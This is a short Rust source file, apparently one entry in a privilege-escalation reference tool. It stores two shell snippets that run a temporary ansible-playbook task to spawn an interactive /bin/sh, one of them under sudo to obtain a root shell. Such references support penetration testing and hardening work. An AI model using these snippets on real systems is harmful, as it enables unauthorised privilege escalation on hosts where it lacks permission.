pub static BIN_NAME: &'static str = "ansible-playbook";

static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
    ansible-playbook $TF
"#;
static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
    sudo ansible-playbook $TF
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SHELL_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
